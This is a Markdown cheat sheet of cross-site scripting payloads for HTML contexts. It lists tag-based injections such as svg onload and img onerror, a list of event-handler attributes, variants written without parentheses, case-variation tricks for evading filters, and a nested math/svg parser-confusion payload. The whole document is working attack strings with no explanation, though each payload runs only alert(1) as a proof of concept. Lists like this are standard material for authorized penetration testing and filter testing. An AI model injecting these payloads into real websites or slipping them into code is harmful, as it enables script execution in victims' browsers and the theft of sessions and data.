# XSS HTML Context Payloads

## Between HTML Tags
```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<isindex action=javascript:alert(1) type=image>
<form action=javascript:alert(1)><input type=submit>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">
```

## Event Handlers
```html
onload=alert(1)
onerror=alert(1)
onmouseover=alert(1)
onclick=alert(1)
onfocus=alert(1)
onblur=alert(1)
onchange=alert(1)
onsubmit=alert(1)
oninput=alert(1)
onkeydown=alert(1)
onkeypress=alert(1)
onkeyup=alert(1)
```

## Without Parentheses
```html
<img src=x onerror=alert`1`>
<svg onload=alert&#40;1&#41;>
<img src=x onerror=window['alert'](1)>
```

## Case Variation
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
<svg ONLOAD=alert(1)>
```
